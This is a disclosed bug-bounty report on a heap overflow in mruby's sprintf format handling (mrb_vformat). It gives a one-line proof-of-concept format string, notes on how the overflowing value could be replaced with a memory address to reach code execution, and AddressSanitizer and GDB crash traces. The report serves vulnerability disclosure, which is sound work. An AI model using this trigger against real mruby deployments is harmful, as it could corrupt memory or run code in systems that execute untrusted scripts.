# mrb_vformat() heap overflow could lead to code execution

## Report Details
- **Report ID**: 192318
- **URL**: https://hackerone.com/reports/192318
- **State**: Closed
- **Severity**: none
- **Submitted**: 2016-12-19T02:39:50.127Z
- **Disclosed**: 2017-02-10T21:48:31.094Z

## Reporter
- **Username**: mg36
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
Description:
====================
**mrb_vformat** is responsible to parse string format like 'printf' in C, the code doesn't check the number given between '%' and '$' .
 **mrb_fixnum_to_str()** is called by **join_ary** and converts the given number from string into integer, this could lead to overwrite and fully control mbr_value object.

POC
====================
The poc is fairly simple an could be triggered from many different place, here is the trivial one :
```
'%A%1094861636$'%2
```
Exploitability:
====================
The value 1094861636 can be changed with any memory pointer address and overwrite mbr_value objects, so there a very high possibility to make a code execution by crafting and grooming the heap and make the pointer to be written in a predicted place.


Here is some debug analysis :
```
simo@vlab64:~/sources/mruby/bin% ./mruby_asan < CRASH.rb
=================================================================
==78222==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x603000004a7d at pc 0x000000524919 bp 0x7fffffffca20 sp 0x7fffffffca18
READ of size 8 at 0x603000004a7d thread T0
    #0 0x524918 in mrb_obj_respond_to /home/simo/sources/mruby_libF/src/class.c:1533:25
    #1 0x524918 in mrb_respond_to /home/simo/sources/mruby_libF/src/class.c:1554
    #2 0x54c00e in convert_type /home/simo/sources/mruby_libF/src/object.c:314:8
    #3 0x54c00e in mrb_check_convert_type /home/simo/sources/mruby_libF/src/object.c:356
    #4 0x50efad in join_ary /home/simo/sources/mruby_libF/src/array.c:1030:13
    #5 0x50eaf5 in mrb_ary_join /home/simo/sources/mruby_libF/src/array.c:1054:10
    #6 0x61c5c2 in mrb_raisef /home/simo/sources/mruby_libF/src/error.c:371:10
    #7 0x664ea8 in check_pos_arg /home/simo/sources/mruby_libF/mrbgems/mruby-sprintf/src/sprintf.c
    #8 0x663264 in mrb_str_format /home/simo/sources/mruby_libF/mrbgems/mruby-sprintf/src/sprintf.c:655:9
    #9 0x65da7d in mrb_f_sprintf /home/simo/sources/mruby_libF/mrbgems/mruby-sprintf/src/sprintf.c:514:12
    #10 0x557e7d in mrb_vm_exec /home/simo/sources/mruby_libF/src/vm.c:1171:18
    #11 0x56b136 in mrb_top_run /home/simo/sources/mruby_libF/src/vm.c:2487:12
    #12 0x5e9629 in mrb_load_exec /home/simo/sources/mruby_libF/mrbgems/mruby-compiler/core/parse.y:5755:7
    #13 0x4ed9f3 in main /home/simo/sources/mruby_libF/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11
    #14 0x7ffff6ee682f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291
    #15 0x41a108 in _start (/home/simo/sources/mruby/bin/fuzz_mruby/mruby_asan+0x41a108)

0x603000004a7d is located 3 bytes to the left of 30-byte region [0x603000004a80,0x603000004a9e)
allocated by thread T0 here:
    #0 0x4c0b4e in realloc (/home/simo/sources/mruby/bin/fuzz_mruby/mruby_asan+0x4c0b4e)
    #1 0x4fc26d in mrb_realloc_simple /home/simo/sources/mruby_libF/src/gc.c:201:8
    #2 0x65c4cc in codegen_realloc /home/simo/sources/mruby_libF/mrbgems/mruby-compiler/core/codegen.c:131:7
    #3 0x65c4cc in scope_finish /home/simo/sources/mruby_libF/mrbgems/mruby-compiler/core/codegen.c:2832
    #4 0x65084a in scope_body /home/simo/sources/mruby_libF/mrbgems/mruby-compiler/core/codegen.c:746:3
    #5 0x62aabc in codegen /home/simo/sources/mruby_libF/mrbgems/mruby-compiler/core/codegen.c:1548:5
    #6 0x6292e2 in mrb_generate_code /home/simo/sources/mruby_libF/mrbgems/mruby-compiler/core/codegen.c:2950:5
    #7 0x5e91c7 in mrb_load_exec /home/simo/sources/mruby_libF/mrbgems/mruby-compiler/core/parse.y:5732:10
    #8 0x4ed9f3 in main /home/simo/sources/mruby_libF/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11
    #9 0x7ffff6ee682f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291

SUMMARY: AddressSanitizer: heap-buffer-overflow /home/simo/sources/mruby_libF/src/class.c:1533:25 in mrb_obj_respond_to
```

GDB output :
```
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/simo/sources/mruby/bin/fuzz_mruby/mruby < crash2.rb

Program received signal SIGSEGV, Segmentation fault.
0x000000000040b44b in mrb_class (mrb=0x6af010, v=...) at /home/simo/sources/patch/mruby/include/mruby/class.h:50
50          return mrb_obj_ptr(v)->c;
(gdb) x/2i $pc
=> 0x40b44b <mrb_class+151>:    mov    rax,QWORD PTR [rax+0x8]
   0x40b44f <mrb_class+155>:    pop    rbp
(gdb) x/xg $rax
0x141424344:    Cannot access memory at address 0x141424344
(gdb) bt
#0  0x000000000040b44b in mrb_class (mrb=0x6af010, v=...) at /home/simo/sources/patch/mruby/include/mruby/class.h:50
#1  0x0000000000410b03 in mrb_respond_to (mrb=0x6af010, obj=..., mid=144) at /home/simo/sources/patch/mruby/src/class.c:1554
#2  0x000000000041c5ac in convert_type (mrb=0x6af010, val=..., tname=0x46f9c6 "String", method=0x46f9bf "to_str", raise=0 '\000') at /home/simo/sources/patch/mruby/src/object.c:314
#3  0x000000000041c85e in mrb_check_convert_type (mrb=0x6af010, val=..., type=MRB_TT_STRING, tname=0x46f9c6 "String", method=0x46f9bf "to_str") at /home/simo/sources/patch/mruby/src/object.c:356
#4  0x000000000042f05f in mrb_check_string_type (mrb=0x6af010, str=...) at /home/simo/sources/patch/mruby/src/string.c:1729
#5  0x000000000040ab4c in join_ary (mrb=0x6af010, ary=..., sep=..., list=...) at /home/simo/sources/patch/mruby/src/array.c:1030
#6  0x000000000040ac94 in mrb_ary_join (mrb=0x6af010, ary=..., sep=...) at /home/simo/sources/patch/mruby/src/array.c:1054
#7  0x000000000044bc23 in mrb_vformat (mrb=0x6af010, format=0x49d208 "numbered(%S) after unnumbered(%S)", ap=0x7fffffffd610) at /home/simo/sources/patch/mruby/src/error.c:347
#8  0x000000000044bdd3 in mrb_raisef (mrb=0x6af010, c=0x6b6650, fmt=0x49d208 "numbered(%S) after unnumbered(%S)") at /home/simo/sources/patch/mruby/src/error.c:371
#9  0x000000000045c410 in check_pos_arg (mrb=0x6af010, posarg=1, n=1094861636) at /home/simo/sources/patch/mruby/mrbgems/mruby-sprintf/src/sprintf.c:158
#10 0x000000000045cf6e in mrb_str_format (mrb=0x6af010, argc=2, argv=0x6c1e60, fmt=...) at /home/simo/sources/patch/mruby/mrbgems/mruby-sprintf/src/sprintf.c:620
#11 0x000000000045c748 in mrb_f_sprintf (mrb=0x6af010, obj=...) at /home/simo/sources/patch/mruby/mrbgems/mruby-sprintf/src/sprintf.c:514
#12 0x0000000000421126 in mrb_vm_exec (mrb=0x6af010, proc=0x6b3fb0, pc=0x48ca78 <gem_mrblib_irep_mruby_sprintf+208>) at /home/simo/sources/patch/mruby/src/vm.c:1171
#13 0x000000000041f63b in mrb_vm_run (mrb=0x6af010, proc=0x6b21e0, self=..., stack_keep=0) at /home/simo/sources/patch/mruby/src/vm.c:772
#14 0x000000000042766b in mrb_top_run (mrb=0x6af010, proc=0x6b21e0, self=..., stack_keep=0) at /home/simo/sources/patch/mruby/src/vm.c:2487
#15 0x0000000000447e56 in mrb_load_exec (mrb=0x6af010, p=0x70b080, c=0x709f30) at /home/simo/sources/patch/mruby/mrbgems/mruby-compiler/core/parse.y:5755
#16 0x0000000000447eec in mrb_load_file_cxt (mrb=0x6af010, f=0x7ffff7ac88e0 <_IO_2_1_stdin_>, c=0x709f30) at /home/simo/sources/patch/mruby/mrbgems/mruby-compiler/core/parse.y:5764
#17 0x000000000040238e in main (argc=1, argv=0x7fffffffe4a8) at /home/simo/sources/patch/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232
(gdb)
```

Unfortunately I couldn't write a reliable patch for this for lack of knowledge about mruby internals and investigating other security bugs which will be reported soon.



## Attachments
No attachments
